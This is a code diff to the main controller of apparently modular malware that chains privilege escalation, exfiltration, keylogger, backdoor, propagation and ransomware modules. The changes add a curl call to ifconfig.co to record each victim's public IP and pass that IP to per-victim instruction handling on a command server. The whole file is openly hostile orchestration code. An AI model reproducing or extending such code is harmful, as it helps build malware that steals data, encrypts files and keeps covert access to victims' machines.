@@ -3,6 +3,7 @@
 ###########################################################################################################################
 
 import os
+import subprocess
 from time import sleep
 
 from modules import privesc
@@ -21,6 +22,12 @@ from modules import ransomware
 # Path: /home/$USER/GR0up7.pem
 NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")
 
+
+PUBLIC_IP = subprocess.run(['curl', 'ifconfig.co'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+PUBLIC_IP = PUBLIC_IP.stdout.strip()
+
+print(f'Public IP: {PUBLIC_IP}')
+
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
@@ -32,6 +39,9 @@ def main():
     if not(os.path.exists(NO_INFECTION_FILE)):
         with open(NO_INFECTION_FILE, 'w') as file: pass
 
+    # Creates a instructions file on the server for this specific victim
+    instructions.create_victim_instruction(PUBLIC_IP)
+
     # Map modules to function
     modules = {
         "privesc": privesc.run,
@@ -40,7 +50,7 @@ def main():
         "exfiltration": exfiltration.run,
         "keylogger": keylogger.run,
         "backdoor": backdoor.run,
-        "instructions": instructions.run,
+        "instructions": lambda victim_ip: instructions.run(victim_ip),
         "ransomware": ransomware.run,
     }
 
@@ -50,7 +60,8 @@ def main():
 
     while next_step != "clean":
         # Execute module and get result and next step
-        result, next_step = modules[next_step]()
+        if next_step == "instructions": result, next_step = modules[next_step](PUBLIC_IP)
+        else: result, next_step = modules[next_step]()
         result = result.split(" ")
 
         if result and len(result) >= 2:
@@ -78,7 +89,7 @@ def main():
                 if result[1] == "start": propagation.run()
 
             if result != "no_data":
-                instructions.reset_instruction()
+                instructions.reset_instruction(PUBLIC_IP)
         elif not result:
             print(f"[-] Module {next_step} failed!")
             break
